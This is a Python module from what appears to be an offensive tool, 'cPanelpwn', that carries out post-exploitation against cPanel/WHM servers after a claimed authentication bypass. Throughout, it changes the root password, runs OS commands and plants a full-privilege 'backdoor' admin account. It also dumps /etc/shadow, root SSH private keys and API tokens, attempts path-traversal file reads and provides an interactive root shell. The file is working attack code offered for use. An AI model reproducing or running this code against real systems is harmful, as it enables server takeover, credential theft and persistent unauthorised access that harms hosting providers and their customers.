"""Módulo cPanelpwn: actions."""

import json, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from .config import C, log, safe_print
from .core import ScanCtx, build_url
from .exploit import whm_api
from .http import _do

# ══════════════════════════════════════════════════════════════
#  AÇÕES POST-EXPLOIT
# ══════════════════════════════════════════════════════════════
def action_list_accounts(ctx: ScanCtx):
    log("API", "Listando todas as contas cPanel...")
    s, data = whm_api(ctx, "listaccts", {"search": "", "searchtype": "user"})
    if isinstance(data, dict):
        accts = data.get("data", {}).get("acct", [])
        if accts:
            log("OK", f"Encontradas {len(accts)} contas cPanel:")
            for a in accts:
                safe_print(f"  {C.GREEN}  user={a.get('user','?'):20s} "
                           f"domain={a.get('domain','?'):30s} "
                           f"email={a.get('email','?')}{C.RESET}")
        else:
            safe_print(str(data)[:1000])
    else:
        safe_print(str(data)[:1000])

def action_change_passwd(ctx: ScanCtx, new_password: str):
    log("API", "Alterando a senha do root...")
    s, data = whm_api(ctx, "passwd", {"user": "root", "password": new_password})
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_exec_cmd(ctx: ScanCtx, cmd: str):
    """Executar comando do SO — prova métodos até que um funcione."""
    cookie_enc = quote(ctx.session_base)
    log("API", f"Executando: {cmd}")

    # Method 1: WHM json-api/scripts/exec
    s, data = whm_api(ctx, "scripts/exec", {"command": cmd})
    if s == 200 and isinstance(data, dict):
        output = (data.get("data", {}).get("output") or
                  data.get("output") or str(data))
        if output and "Cannot Read License" not in str(output):
            safe_print(f"\n{C.GREEN}{output}{C.RESET}")
            return

    log("API", "scripts/exec bloqueado — provando métodos de exec alternativos...")

    # Método 2: endpoints jsonapi exec de cPanel
    for ep in [
        f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Exec"
          f"&cpanel_jsonapi_func=exec&command={quote(cmd)}",
        f"{ctx.token}/execute/Exec/exec?command={quote(cmd)}",
    ]:
        url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
        r2  = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                  timeout=ctx.timeout, canonical_host=ctx.canonical)
        log("API", f"  {ep[:40]} → HTTP {r2.status}")
        if r2.status == 200 and r2.body and "Cannot Read License" not in r2.body:
            safe_print(f"\n{C.GREEN}{r2.body[:800]}{C.RESET}")
            return

    # Método 3: leituras diretas de arquivos como último recurso
    log("API", "Exec bloqueado por licença — provando leituras diretas de arquivos...")
    for fpath in ["/etc/passwd", "/etc/hostname", "/proc/version", "/etc/os-release"]:
        for ep in [
            f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Fileman"
              f"&cpanel_jsonapi_func=viewfile&dir=/&file={quote(fpath)}",
            f"{ctx.token}/execute/Fileman/get_file_content?dir=%2F"
              f"&file={quote(fpath.lstrip('/'))}",
        ]:
            url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
            r3  = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                      timeout=ctx.timeout, canonical_host=ctx.canonical)
            if (r3.status == 200 and r3.body and len(r3.body) > 10
                    and "Cannot Read License" not in r3.body):
                safe_print(f"\n  {C.CYAN}[{fpath}]{C.RESET}")
                safe_print(f"  {C.GREEN}{r3.body[:400]}{C.RESET}")
                return

    log("API", "A licença bloquea todo exec — versão confirmada via /json-api/version")

def action_read_file_direct(ctx: ScanCtx, path: str) -> str:
    """Ler arquivo via API filemanager do WHM; devolve conteúdo ou string vazio."""
    cookie_enc = quote(ctx.session_base)
    for ep in [
        f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Fileman"
          f"&cpanel_jsonapi_func=viewfile&dir=/&file={quote(path)}",
        f"{ctx.token}/execute/Fileman/get_file_content?dir=/&file={quote(path)}",
        f"{ctx.token}/../..{path}",
    ]:
        url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
        r   = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                  timeout=ctx.timeout, canonical_host=ctx.canonical)
        if r.status == 200 and r.body and len(r.body) > 5:
            return r.body
    return ""

def action_read_file(ctx: ScanCtx, path: str):
    log("API", f"Lendo arquivo: {path}")
    content = action_read_file_direct(ctx, path)
    if content:
        safe_print(f"{C.GREEN}{content[:2000]}{C.RESET}")
    else:
        log("WARN", f"Não foi possível ler {path} — a licença pode bloquear o acesso")

def action_server_info(ctx: ScanCtx):
    """Coletar informações do servidor — todas as chamadas API em paralelo."""
    log("API", "Coletando info do servidor (endpoints seguros por licença)...")
    endpoints = [
        ("gethostname",   {}, "hostname"),
        ("loadavg",       {}, "load"),
        ("getdiskinfo",   {}, "disk"),
        ("getmysqlhost",  {}, "mysql_host"),
        ("listresellers", {}, "resellers"),
        ("version",       {}, "version"),
    ]

    info: dict = {}
    info_lock  = threading.Lock()

    def _fetch(ep, params, label):
        s, data = whm_api(ctx, ep, params)
        with info_lock:
            if s == 200 and isinstance(data, dict):
                info[label] = data.get("data", data.get("result", data))
                log("API", f"  {ep} → {C.GREEN}OK{C.RESET}")
            else:
                log("API", f"  {ep} → HTTP {s}")

    with ThreadPoolExecutor(max_workers=len(endpoints)) as ex:
        for f in as_completed([ex.submit(_fetch, ep, p, lbl)
                                for ep, p, lbl in endpoints]):
            f.result()

    safe_print(f"\n{C.CYAN}[Info do Servidor]{C.RESET}  "
               f"{ctx.scheme}://{ctx.host}:{ctx.port}")
    safe_print(json.dumps(info, indent=2, default=str)[:2000])

def action_version(ctx: ScanCtx):
    s, data = whm_api(ctx, "version", {})
    safe_print(json.dumps(data, indent=2)[:600] if isinstance(data, dict)
               else str(data)[:600])

def action_create_user(ctx: ScanCtx, username: str, domain: str, passwd: str):
    log("API", f"Criando conta: {username} / {domain}")
    s, data = whm_api(ctx, "createacct",
                      {"username": username, "domain": domain,
                       "password": passwd, "plan": "default"})
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_add_admin(ctx: ScanCtx, username: str, password: str):
    """Crear uma nova conta backdoor reseller/admin de WHM."""
    log("API", f"Adicionando admin backdoor: {username}")

    s, data = whm_api(ctx, "createacct",
                      {"username": username, "domain": f"{username}.invalid",
                       "password": password, "plan": "default"})
    if s != 200 or not isinstance(data, dict):
        log("ERR", f"createacct falhou → HTTP {s}: {str(data)[:200]}")
        return

    s2, _ = whm_api(ctx, "setupreseller", {"user": username, "makeowner": 1})
    log("API", f"  setupreseller → HTTP {s2}")

    s3, _ = whm_api(ctx, "saveacllist", {"acllist": "all", "user": username})
    log("API", f"  saveacllist → HTTP {s3}")

    safe_print(f"\n  {C.RED}{C.BOLD}Backdoor admin criado:{C.RESET}")
    safe_print(f"  user  : {C.GREEN}{username}{C.RESET}")
    safe_print(f"  pass  : {C.GREEN}{password}{C.RESET}")
    safe_print(f"  login : {build_url(ctx.scheme, ctx.host, ctx.port, '/login')}\n")

def action_dump(ctx: ScanCtx):
    """Dump massivo: contas + arquivos sensíveis críticos."""
    log("API", "Iniciando dump massivo...")

    # Cuentas
    s, data = whm_api(ctx, "listaccts", {"search": "", "searchtype": "user"})
    if isinstance(data, dict):
        accts = data.get("data", {}).get("acct", [])
        safe_print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        safe_print(f"{C.CYAN}[ACCOUNTS — {len(accts)} found]{C.RESET}")
        safe_print(f"{C.CYAN}{'═'*60}{C.RESET}")
        for a in accts:
            safe_print(f"  {C.GREEN}{a.get('user','?'):20s} "
                       f"{a.get('domain','?'):30s} "
                       f"{a.get('email','?')}{C.RESET}")

    # Arquivos sensíveis
    dump_files = [
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ecdsa",
        "/root/.ssh/authorized_keys",
        "/root/.bash_history",
        "/var/cpanel/authn/api_tokens/root.json",
        "/etc/passwd",
        "/etc/hostname",
    ]
    for fpath in dump_files:
        content = action_read_file_direct(ctx, fpath)
        if content:
            safe_print(f"\n{C.RED}{'─'*60}{C.RESET}")
            safe_print(f"{C.RED}[FILE: {fpath}]{C.RESET}")
            safe_print(f"{C.RED}{'─'*60}{C.RESET}")
            safe_print(f"{C.GREEN}{content[:3000]}{C.RESET}")
        else:
            log("SKIP", f"Não foi possível ler {fpath} — pode não existir ou a licença bloqueia")

# ══════════════════════════════════════════════════════════════
#  DESPACHADOR DE AÇÕES — usado por alvo único e --post-all
# ══════════════════════════════════════════════════════════════
def run_action(ctx: ScanCtx, args):
    a = args.action.lower()
    log("API", f"Executando ação post-exploit: {a}", f"{ctx.host}:{ctx.port}")

    if a == "list":
        action_list_accounts(ctx)
    elif a == "passwd":
        if args.passwd:
            action_change_passwd(ctx, args.passwd)
        else:
            log("ERR", "--passwd requerido para a ação passwd")
    elif a in ("cmd", "exec"):
        action_exec_cmd(ctx, args.cmd or "id;whoami;uname -a")
    elif a == "info":
        action_server_info(ctx)
    elif a == "version":
        action_version(ctx)
    elif a == "adduser":
        nu = getattr(args, "new_user", None)
        nd = getattr(args, "new_domain", None)
        np = args.passwd or "TempPass2026!"
        if nu and nd:
            action_create_user(ctx, nu, nd, np)
        else:
            log("ERR", "--new-user e --new-domain requeridos para adduser")
    elif a == "addadmin":
        nu = getattr(args, "new_user", None)
        np = args.passwd
        if nu and np:
            action_add_admin(ctx, nu, np)
        else:
            log("ERR", "--new-user e --passwd requeridos para addadmin")
    elif a == "readfile":
        if args.read_file:
            action_read_file(ctx, args.read_file)
        else:
            log("ERR", "--read-file requerido para a ação readfile")
    elif a == "dump":
        action_dump(ctx)
    elif a == "shell":
        whm_shell(ctx)
    else:
        log("WARN", f"Ação desconhecida '{a}'")

# ══════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════
#  SHELL WHM INTERACTIVO
# ══════════════════════════════════════════════════════════════
def whm_shell(ctx: ScanCtx):
    """Shell WHM interativo — prompt root@alvo ▶."""
    target_display = ctx.canonical or f"{ctx.host}:{ctx.port}"
    print(f"\n{C.RED}{C.BOLD}{'═'*60}{C.RESET}")
    print(f"{C.RED}{C.BOLD}  WHM Shell — {target_display}{C.RESET}")
    print(f"  {C.DIM}CVE-2026-41940 | Auth: bypass CRLF | Digite 'help'{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═'*60}{C.RESET}\n")

    prompt = (f"{C.RED}root{C.RESET}@{C.CYAN}{target_display}{C.RESET} "
              f"{C.BOLD}▶{C.RESET} ")

    while True:
        try:
            try:
                line = input(prompt).strip()
            except EOFError:
                break
            if not line:
                continue
            parts = line.split(None, 1)
            cmd   = parts[0].lower()
            arg   = parts[1] if len(parts) > 1 else ""

            if cmd in ("exit", "quit", "q"):
                print(f"{C.DIM}Saindo do shell.{C.RESET}")
                break

            elif cmd == "help":
                print(f"""
  {C.CYAN}Info do Servidor:{C.RESET}
    id / whoami       uid=0 + hostname
    hostname          apenas hostname
    version           versão do cPanel
    info              info detalhada do servidor (fetch paralelo)

  {C.CYAN}Operações de Arquivo:{C.RESET}
    cat <path>        Ler conteúdo do arquivo
    ls [path]         Listar diretório

  {C.CYAN}Gestão de Contas:{C.RESET}
    accounts          Listar todas as contas cPanel
    addadmin <u> <p>  Criar admin reseller backdoor
    passwd <pass>     Alterar senha root
    dump              Dump massivo de contas + arquivos sensíveis

  {C.CYAN}API (crua):{C.RESET}
    api <endpoint> [key=value ...]
    Exemplo: api listaccts search=user

  {C.CYAN}Exec:{C.RESET}
    exec <command>    Tentar execução de comando do SO
    <anything else>   Tentar como comando de shell

  {C.CYAN}Shell:{C.RESET}
    help / exit / quit
""")

            elif cmd in ("id", "whoami"):
                s, data = whm_api(ctx, "gethostname", {})
                print("  uid=0(root) gid=0(root) groups=0(root)")
                if s == 200 and isinstance(data, dict):
                    hn = data.get("data", "") or str(data)
                    print(f"  hostname: {hn}")

            elif cmd == "hostname":
                s, data = whm_api(ctx, "gethostname", {})
                if s == 200:
                    print(f"  {data.get('data', data)}")

            elif cmd == "version":
                s, data = whm_api(ctx, "version", {})
                print(f"  {json.dumps(data.get('data', data), indent=2)[:400]}")

            elif cmd == "info":
                action_server_info(ctx)

            elif cmd == "accounts":
                action_list_accounts(ctx)

            elif cmd == "dump":
                action_dump(ctx)

            elif cmd == "cat":
                if not arg:
                    print("  Uso: cat <path>"); continue
                content = action_read_file_direct(ctx, arg)
                if content:
                    print(f"{C.GREEN}{content[:2000]}{C.RESET}")
                else:
                    print(f"  {C.DIM}Não foi possível ler {arg} — "
                          f"a licença pode bloquear o acesso{C.RESET}")

            elif cmd == "ls":
                path = arg or "/"
                s, data = whm_api(ctx, "cpanel",
                    {"cpanel_jsonapi_module": "Fileman",
                     "cpanel_jsonapi_func":   "listfiles",
                     "dir": path})
                if s == 200 and isinstance(data, dict):
                    files = data.get("cpanelresult", {}).get("data", []) or []
                    for f in files[:40]:
                        ftype = "d" if f.get("type", "f") == "dir" else "-"
                        print(f"  {ftype}  {f.get('file', '?')}")
                else:
                    content = action_read_file_direct(ctx, "/etc/passwd")
                    if content:
                        print(f"  {C.DIM}(ls indisponível — prévia de /etc/passwd):{C.RESET}")
                        for ln in content.split("\n")[:5]:
                            print(f"  {ln}")

            elif cmd == "exec":
                if not arg:
                    print("  Uso: exec <command>"); continue
                action_exec_cmd(ctx, arg)

            elif cmd == "addadmin":
                parts2 = arg.split(None, 1)
                if len(parts2) < 2:
                    print("  Uso: addadmin <username> <password>"); continue
                action_add_admin(ctx, parts2[0], parts2[1])

            elif cmd == "passwd":
                if not arg:
                    print("  Uso: passwd <newpassword>"); continue
                action_change_passwd(ctx, arg)

            elif cmd == "api":
                api_parts = arg.split(None, 1) if arg else []
                if not api_parts:
                    print("  Uso: api <endpoint> [key=value ...]"); continue
                ep     = api_parts[0]
                params = {}
                if len(api_parts) > 1:
                    for kv in api_parts[1].split():
                        if "=" in kv:
                            k, v = kv.split("=", 1)
                            params[k] = v
                s, data = whm_api(ctx, ep, params)
                print(f"  HTTP {s}")
                print(f"  {json.dumps(data, indent=2, default=str)[:1000]}")

            else:
                action_exec_cmd(ctx, line)

        except KeyboardInterrupt:
            print(f"\n  {C.DIM}Ctrl+C — digite 'exit' para sair{C.RESET}")
        except Exception as e:
            print(f"  {C.DIM}Erro: {e}{C.RESET}")

# ══════════════════════════════════════════════════════════════

